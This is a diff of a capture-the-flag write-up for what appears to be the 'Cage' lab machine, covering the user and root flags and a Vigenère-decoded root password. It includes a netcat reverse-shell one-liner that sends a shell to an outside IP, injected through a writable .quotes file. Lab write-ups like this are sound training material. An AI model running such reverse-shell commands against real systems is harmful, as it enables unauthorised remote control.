@@ -21,10 +21,18 @@ Fun, because Cage is fun :)
 
 9. I overwrote .quotes with the following and waited:
 
-    echo ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.226.229 4444 >/tmp/f" > .quotes
+    `echo ";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.226.229 4444 >/tmp/f" > .quotes`
 
 ## Reverse Shell as Cage
 
 10. Once the shell popped, I navigated to `/home/cage`. In there was a file, `Super_Duper_Checklist` which contained the **user flag**.
 
 11. There was also an `email_backup` directory. Under there were three rather humorous emails, where Cage's agent is revealed to be the root user. There was also a hint to the password, `haiinspsyanileph`
+
+## Finish
+
+12. It took me a while to figure this one out, largely because it failed via my vignere brute forcer (which stops on the first entropically significant key, leading to an incorrect guess). It is a vignere cypher, and the password is `face`, a hint gained from the email where its found which repeats the word a lot (a bit silly). This gives the root password `cageisnotalegend`.
+
+    > as a note, it might be interesting to build a vignere brute forcer. Could brute force character combinations, and check each as a cipher while testing for english words from a word list maybe.
+
+13. After `su root`, inside the root folder is another email backup set, of which the final email gives the **root flag**.
